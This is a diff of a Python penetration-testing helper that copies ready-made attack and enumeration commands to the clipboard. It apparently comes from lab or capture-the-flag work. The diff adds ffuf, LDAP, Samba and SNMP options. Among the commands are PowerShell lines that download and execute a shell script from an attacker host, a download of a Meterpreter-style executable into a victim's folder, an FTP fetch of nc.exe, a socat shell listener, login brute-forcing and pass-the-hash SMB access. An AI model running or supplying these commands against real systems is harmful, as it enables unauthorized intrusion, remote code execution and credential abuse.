@@ -29,6 +29,11 @@ Invoke-Bloodhound -CollectionMethod All
 (for %t in ("open 10.1.1.110 21" ftp bin "GET nc.exe" bye) do @echo %~t) >ftp.txt&&ftp -s:ftp.txt
 netstat -alnp
 netstat -plnt
+grep -rl
+/usr/share/john/ssh2john.py
+
+rwinrm
+type nul > your_file.txt
 """
 
 """
@@ -124,7 +129,9 @@ def nmap():
         2: ["nmap phase 2", f"nmap -sSV -sC -Pn -nvv -p{ports} -A --version-intensity 9 -O --reason -T4 -oN {store_directory}/{target_ip}_network_nmap_detailed.txt {target_ip}"],
         3: ["nmap phase 3", f"nmap -A -O --script vuln -p{ports} -oN {store_directory}/{target_ip}_network_nmap_vuln_scan.txt {target_ip}"],
         4: ["nmap udp scan", f"nmap -Pn -p- -nvvv -sU --stats-every 3m --max-retries 2 --min-rate 5000 -oN {store_directory}/{target_ip}_network_nmap_udp_ports.txt {target_ip}"],
-        5: ["nmap example script usage", f"nmap -T4 -sV --script=firewalk.nse -oN {store_directory}/{target_ip}_network_nmap_firewalk.txt {target_ip}"]
+        5: ["nmap example script usage", f"nmap -T4 -sV --script=firewalk.nse -oN {store_directory}/{target_ip}_network_nmap_firewalk.txt {target_ip}"],
+        6: ["nmap grep for open port", r"cat file_name | grep open | awk -F ' ' '{print $1}' | awk -F '/' '{print $1}' | paste -s -d, -"],
+        7: ["Filter nmap script", r"ls /usr/share/nmap/scripts | grep <value>"]
     }
 
     copy_to_clipboard(options)
@@ -241,7 +248,25 @@ def dirsearch():
         word_list = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
 
     options = {
-        1 : [f"dirsearch -u http://{url}/ -L {word_list} -E"]
+        1 : ["Sample usage", f"dirsearch -u http://{url}/ -w {word_list} -E"]
+    }
+
+    copy_to_clipboard(options)
+
+def ffuf():
+    print("Please enter the url to scan not including http (Default: Target's IP address). Leave blank to use default")
+    url = get_url()
+    if url == "":
+        url = target_ip
+
+    print("Please enter word list location (Leave blank for default: directory-list-2.3-medium.txt). Others: /mnt/hgfs/Pentest/word_lists/list.txt")
+    word_list = input("Input: ").strip()
+    if word_list == "":
+        word_list = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
+
+    options = {
+        1 : ["Sample usage", f"ffuf -u http://{url}/FUZZ -w {word_list}"],
+        2 : ["Sample usage 2", f'ffuf -w {word_list} -X POST -d "username=admin\&password=FUZZ" -u http://{url}/login.php -fc 401']
     }
 
     copy_to_clipboard(options)
@@ -353,16 +378,6 @@ def msfvenom():
     }
     
     copy_to_clipboard(options)
-
-def smbclient():
-    var = """\\"""
-    options = {
-        1 : ["Sample usage 1", f"smbclient -L {target_ip}"],
-        2 : ["Sample usage 2", f'smbclient "\\\\\\{var}{target_ip}\<sharename>"'],
-        3 : ["Sample usage 3", f'smbclient -U <username> //{target_ip}/<sharename>'],
-        4 : ["Sample usage 4", f'smbclient //MOUNT/<sharename> -I {target_ip} -N'],
-        5: ["Sample usage 5", f'smbclient -U <username>%<hash> --pw-nt-hash -L {target_ip}']
-    }
     
     copy_to_clipboard(options)
 
@@ -452,7 +467,7 @@ def dig():
 
 def enum4linux():
     options = {
-        1 : ["All options with enum4linux", f"enum4linux -a {target_ip} | tee {store_directory}/{target_ip}_enum.txt"]
+        1 : ["All options with enum4linux", f"enum4linux -a {target_ip} | tee {store_directory}/{target_ip}_enum4linux.txt"]
     }
     
     copy_to_clipboard(options)
@@ -463,6 +478,15 @@ def smtp_user_enum():
     }
     
     copy_to_clipboard(options)
+
+def ldap():
+    options = {
+        1 : ["Sample usage 1", f'ldapsearch -x -h {target_ip} -b "dc=megabank,dc=local"'],
+        2 : ["Sample usage 1", f"""ldapsearch -x -h {target_ip} -b "dc=megabank,dc=local" -LLL '(&(objectclass=user)(!(lastLogon=0)))'"""],
+        3 : ["Sample usage 3", f'nmap -p 389 --script ldap-search {target_ip}'],
+    }
+    
+    copy_to_clipboard(options)    
 
 def mount():
     options = {
@@ -496,9 +520,8 @@ def powershell():
         3 : ["Download and execute powershell script", f"IEX(New-Object Net.WebClient).downloadString('http://{source_ip}/shell.ps1')"],
         4 : ["Download and execute powershell script 2", f"IEX(IWR('http://{source_ip}/shell.ps1'))"],
         5 : ["Execute powershell script", f"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File shell.ps1"],
-        6 : ["Download file with powershell step 1", f"$WebClient = New-Object System.Net.WebClient"],
-        7 : ["Download file with powershell step 2", f"""$WebClient.DownloadFile("https://{source_ip}/file","C:\path\file")"""],
-        8 : ["Search for file", f"""Get-ChildItem -Path C:\ -Filter *[filename]* -Recurse -ErrorAction SilentlyContinue -Force"""]
+        6 : ["Download file with powershell", f"(new-object System.Net.WebClient).DownloadFile('http://10.10.14.143:8000/met8888.exe','C:\Users\mhope\Documents\met8888.exe')"],
+        7 : ["Search for file", f"""Get-ChildItem -Path C:\ -Filter *[filename]* -Recurse -ErrorAction SilentlyContinue -Force"""]
     }
     
     copy_to_clipboard(options)
@@ -578,6 +601,22 @@ def merlin():
     
     copy_to_clipboard(options)
 
+def samba():
+    var = """\\"""
+    options = {
+        1 : ["Identify version of samba", f"nmap --script smb-os-discovery -p445 {target_ip}"],
+        2 : ["List sambda shares with nmap", f"nmap --script smb-enum-shares.nse {target_ip}"],
+        3 : ["Check share permissions", f"smbmap -H {target_ip}"],
+        4 : ["smbclient usage 1 - list sambda share", f"smbclient -L {target_ip}"],
+        5 : ["smbclient usage 2", f'smbclient "\\\\\\{var}{target_ip}\<sharename>"'],
+        6 : ["smbclient usage 3", f'smbclient -U <username> //{target_ip}/<sharename>'],
+        7 : ["smbclient usage 4", f'smbclient //MOUNT/<sharename> -I {target_ip} -N'],
+        8 : ["smbclient usage 5", f'smbclient -U <username>%<hash> --pw-nt-hash -L {target_ip}'],
+        9 : ["smbclient usage 5", f"""smbclient "\\\\\\{var}{target_ip}\<sharename>" -U <username>%<pass> -c 'recurse;ls'"""]
+    }
+    
+    copy_to_clipboard(options)
+
 def socat():
     options = {
         1 : ["Listen on server", r"""socat file:`tty`,raw,echo=0 tcp-listen:888"""],
@@ -589,7 +628,10 @@ def socat():
 def snmp():
     options = {
         1 : ["Enumerate snmp - need to change version and community string", f"""snmpwalk -c public {target_ip} -v 2c"""],
-        2 : ["Enumerate using onesixtyone", f"""onesixtyone -c /usr/share/doc/onesixtyone/dict.txt {target_ip}"""]
+        2 : ["Enumerate using onesixtyone", f"""onesixtyone -c /usr/share/doc/onesixtyone/dict.txt {target_ip}"""],
+        3 : ["Enumerate using nmap 1", f"""nmap -sU -p 161 --script=snmp-win32-services {target_ip}"""],
+        4 : ["Enumerate using nmap 2", f"""nmap -sU -p 161 --script=snmp-brute {target_ip}"""],
+        5 : ["Default community wordlist", f"""/usr/share/nmap/nselib/data/snmpcommunities.lst"""]
     }
     
     copy_to_clipboard(options)
@@ -701,7 +743,6 @@ options = {
     "ssh" : ssh,
     "nc" : nc,
     "msfvenom" : msfvenom,
-    "smbclient" : smbclient,
     "cewl" : cewl,
     "wpscan": wpscan,
     "sshuttle": sshuttle,
@@ -729,7 +770,10 @@ options = {
     "grep": grep,
     "cafae": cafae,
     "patator": patator,
-    "dirsearch": dirsearch
+    "dirsearch": dirsearch,
+    "ffuf": ffuf,
+    "samba": samba,
+    "ldap": ldap
 }
 
 systems = {"windows" : windows, "linux" : linux}
